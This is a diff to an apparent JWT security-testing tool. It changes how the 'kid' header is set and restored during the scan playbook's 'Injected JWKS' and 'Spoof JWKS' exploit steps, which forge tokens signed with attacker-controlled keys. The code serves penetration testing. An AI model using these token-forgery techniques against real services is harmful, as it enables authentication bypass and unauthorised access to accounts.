@@ -739,6 +739,7 @@ def jwksGen(headDict, paylDict, jku, privKey, kid="jwt_tool"):
     newjwks = buildJWKS(n, e, kid)
     newHead["jku"] = jku
     newHead["alg"] = "RS256"
+    newHead["kid"] = config["customising"]["jwks_kid"]
     key = RSA.importKey(privKey)
     newContents = genContents(newHead, paylDict)
     newContents = newContents.encode('UTF-8')
@@ -1370,6 +1371,10 @@ def injectOut(newheadDict, newpaylDict):
 def scanModePlaybook():
     cprintc("\nLAUNCHING SCAN: JWT Attack Playbook", "magenta")
     origalg = headDict["alg"]
+    try:
+        origkid = headDict["kid"]
+    except:
+        origkid = False
     # No token
     tmpCookies = config['argvals']['cookies']
     tmpHeader = config['argvals']['header']
@@ -1419,6 +1424,10 @@ def scanModePlaybook():
     jwksig, jwksContents = jwksEmbed(headDict, paylDict)
     jwtOut(jwksContents+"."+jwksig, "Exploit: Injected JWKS (-X i)")
     headDict["alg"] = origalg
+    if origkid:
+        headDict["kid"] = origkid
+    else:
+        del headDict["kid"]
     if origjwk:
         headDict["jwk"] = origjwk
     else:
@@ -1431,6 +1440,10 @@ def scanModePlaybook():
     jku = config['services']['jwksloc']
     newContents, newSig = exportJWKS(jku)
     jwtOut(newContents+"."+newSig, "Exploit: Spoof JWKS (-X s)", "Signed with JWKS at "+config['services']['jwksloc'])
+    if origkid:
+        headDict["kid"] = origkid
+    else:
+        del headDict["kid"]
     if origjku:
         headDict["jku"] = origjku
     else:
